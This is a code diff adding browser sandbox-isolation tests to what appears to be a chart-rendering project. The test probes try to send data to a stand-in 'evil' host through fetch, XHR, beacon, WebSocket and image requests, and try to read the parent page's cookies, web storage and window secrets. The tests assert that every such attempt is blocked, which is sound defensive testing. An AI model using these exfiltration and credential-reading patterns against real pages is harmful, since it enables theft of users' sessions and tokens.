@@ -7,7 +7,7 @@ iframe exactly as Studio will — real Chromium via Playwright, no CDN, no
 stand-in — and are skipped when no Chromium is installed, the same posture
 ``test_rasterise.py`` takes (#201).
 
-Iframe isolation beyond the CSP's script policy (#210), CSS-scoping
+CSS-scoping
 adversarial cases (#211), pinned-library load order at scale (#212), size
 caps (#213) and safe embedding of adversarial ``</script>``/``<!--`` text
 (#214) are later tickets'.
@@ -463,3 +463,224 @@ document.head.appendChild(injected);
     assert main.evaluate("() => window.__injected") is None
     # The hash-allowed module itself still ran fine under the same policy.
     assert main.evaluate("() => typeof window.render") == "function"
+
+
+# --- Real browser: the sandbox actually isolates (#210) ------------------
+#
+# The host page is served from a real http origin (routed, no network) so
+# it can hold a cookie and localStorage/sessionStorage entries of its own;
+# the shell is mounted as a sandboxed srcdoc iframe exactly as Studio will.
+# Each probe module records what it observed on `window.__probe`.
+
+_HOST_ORIGIN = "http://host.chartagent.test"
+_EVIL_ORIGIN = "http://evil.chartagent.test"
+_HOST_SECRET = "host-secret-value"
+
+
+@dataclasses.dataclass
+class _HostPage:
+    page: object
+    evil_requests: list[str]
+
+
+@pytest.fixture()
+def host(request: pytest.FixtureRequest) -> Iterator[_HostPage]:
+    from playwright.sync_api import sync_playwright
+
+    with sync_playwright() as p:
+        browser = p.chromium.launch()
+        context = browser.new_context()
+        context.add_cookies(
+            [{"name": "session", "value": _HOST_SECRET, "url": _HOST_ORIGIN}]
+        )
+        evil_requests: list[str] = []
+
+        def _route(route: object) -> None:
+            url = route.request.url  # type: ignore[attr-defined]
+            if url.startswith(_EVIL_ORIGIN):
+                evil_requests.append(url)
+                route.fulfill(status=200, body="leaked")  # type: ignore[attr-defined]
+            else:
+                route.fulfill(  # type: ignore[attr-defined]
+                    status=200, content_type="text/html", body="<!doctype html>"
+                )
+
+        context.route("**/*", _route)
+        pw_page = context.new_page()
+        pw_page.goto(_HOST_ORIGIN + "/")
+        yield _HostPage(page=pw_page, evil_requests=evil_requests)
+        browser.close()
+
+
+def _mount_probe(host: _HostPage, probe_body: str) -> object:
+    """Mount a shell whose module runs ``probe_body`` and return its frame."""
+    module = (
+        _RENDER_MODULE
+        + f"""
+window.__probe = {{}};
+function __attempt(name, fn) {{
+  try {{ window.__probe[name] = {{ value: fn() }}; }}
+  catch (e) {{ window.__probe[name] = {{ error: e && e.name }}; }}
+}}
+{probe_body}
+"""
+    )
+    shell = build_shell(_from_scratch_document(module=module), libraries={})
+    page = host.page
+    page.evaluate(  # type: ignore[attr-defined]
+        """([secret, origin]) => {
+          document.cookie = "docsecret=" + secret;
+          localStorage.setItem("token", secret);
+          sessionStorage.setItem("token", secret);
+          window.__hostSecret = secret;
+          window.__acks = [];
+          window.addEventListener("message", (e) => window.__acks.push(e.data));
+        }""",
+        [_HOST_SECRET, _HOST_ORIGIN],
+    )
+    page.evaluate(  # type: ignore[attr-defined]
+        """([sandbox, srcdoc]) => {
+          const f = document.createElement("iframe");
+          f.name = "main";
+          f.setAttribute("sandbox", sandbox);
+          f.srcdoc = srcdoc;
+          document.body.appendChild(f);
+        }""",
+        [" ".join(shell.sandbox), shell.html],
+    )
+    frame = None
+    for _ in range(50):
+        frame = page.frame(name="main")  # type: ignore[attr-defined]
+        if frame is not None and frame.evaluate("() => !!window.__probe"):
+            break
+        page.wait_for_timeout(50)  # type: ignore[attr-defined]
+    assert frame is not None
+    return frame
+
+
+@pytestmark_live
+def test_module_cannot_reach_the_network_via_fetch_or_xhr(host: _HostPage) -> None:
+    url = _EVIL_ORIGIN + "/exfil"
+    frame = _mount_probe(
+        host,
+        f"""
+window.__probe.fetch = "pending";
+fetch({url!r}).then(
+  function () {{ window.__probe.fetch = "resolved"; }},
+  function (e) {{ window.__probe.fetch = "rejected"; }}
+);
+window.__probe.xhr = "pending";
+try {{
+  var x = new XMLHttpRequest();
+  x.open("GET", {url!r});
+  x.onload = function () {{ window.__probe.xhr = "loaded"; }};
+  x.onerror = function () {{ window.__probe.xhr = "error"; }};
+  x.send();
+}} catch (e) {{ window.__probe.xhr = "threw"; }}
+""",
+    )
+    host.page.wait_for_timeout(300)  # type: ignore[attr-defined]
+
+    probe = frame.evaluate("() => window.__probe")  # type: ignore[attr-defined]
+    assert probe["fetch"] == "rejected"
+    assert probe["xhr"] in ("error", "threw")
+    assert host.evil_requests == []
+
+
+@pytestmark_live
+def test_module_cannot_reach_the_network_via_beacon_websocket_or_image(
+    host: _HostPage,
+) -> None:
+    url = _EVIL_ORIGIN + "/exfil"
+    frame = _mount_probe(
+        host,
+        f"""
+__attempt("beacon", function () {{ return navigator.sendBeacon({url!r}, "x"); }});
+__attempt("ws", function () {{ return new WebSocket({url.replace("http", "ws")!r}); }});
+var img = new Image();
+img.src = {url!r};
+""",
+    )
+    host.page.wait_for_timeout(300)  # type: ignore[attr-defined]
+
+    probe = frame.evaluate("() => window.__probe")  # type: ignore[attr-defined]
+    # sendBeacon returns true once queued; the request log is the signal.
+    assert "beacon" in probe and "ws" in probe
+    assert host.evil_requests == []
+
+
+@pytestmark_live
+def test_module_sees_none_of_the_parents_cookies(host: _HostPage) -> None:
+    frame = _mount_probe(
+        host, '__attempt("cookie", function () { return document.cookie; });'
+    )
+    probe = frame.evaluate("() => window.__probe")  # type: ignore[attr-defined]
+
+    # An opaque origin has no cookie jar: reading throws (or, at most,
+    # returns nothing) — it never returns the parent's cookie.
+    assert probe["cookie"].get("error") == "SecurityError" or not probe["cookie"].get(
+        "value"
+    )
+    assert _HOST_SECRET not in str(probe["cookie"])
+
+
+@pytestmark_live
+def test_module_sees_none_of_the_parents_web_storage(host: _HostPage) -> None:
+    frame = _mount_probe(
+        host,
+        """
+__attempt("local", function () { return localStorage.getItem("token"); });
+__attempt("session", function () { return sessionStorage.getItem("token"); });
+""",
+    )
+    probe = frame.evaluate("() => window.__probe")  # type: ignore[attr-defined]
+
+    for kind in ("local", "session"):
+        assert probe[kind].get("error") == "SecurityError" or not probe[kind].get(
+            "value"
+        )
+    assert _HOST_SECRET not in str(probe)
+
+
+@pytestmark_live
+def test_module_cannot_reach_the_parents_window_objects(host: _HostPage) -> None:
+    frame = _mount_probe(
+        host,
+        """
+__attempt("parentDocument", function () { return window.parent.document.title; });
+__attempt("parentSecret", function () { return window.parent.__hostSecret; });
+__attempt("parentLocation", function () { return window.parent.location.href; });
+__attempt("parentStorage", function () {
+  return window.parent.localStorage.getItem("token");
+});
+__attempt("topDocument", function () { return window.top.document.cookie; });
+__attempt("frameElement", function () { return window.frameElement; });
+__attempt("opener", function () { return window.opener; });
+""",
+    )
+    probe = frame.evaluate("() => window.__probe")  # type: ignore[attr-defined]
+
+    for name in (
+        "parentDocument",
+        "parentSecret",
+        "parentLocation",
+        "parentStorage",
+        "topDocument",
+    ):
+        assert probe[name].get("error") == "SecurityError", name
+    assert probe["frameElement"]["value"] is None
+    assert probe["opener"]["value"] is None
+    assert _HOST_SECRET not in str(probe)
+
+
+@pytestmark_live
+def test_the_bootstrap_postmessage_channel_still_works_under_isolation(
+    host: _HostPage,
+) -> None:
+    _mount_probe(host, "")
+    rows, _ = serialize_rows(pa.table({"a": [1]}), {"a": "BIGINT"})
+    _post_paint(host.page, rows)
+    host.page.wait_for_function("() => window.__acks.length > 0")  # type: ignore[attr-defined]
+    acks = host.page.evaluate("() => window.__acks")  # type: ignore[attr-defined]
+
+    assert acks[0]["ok"] is True
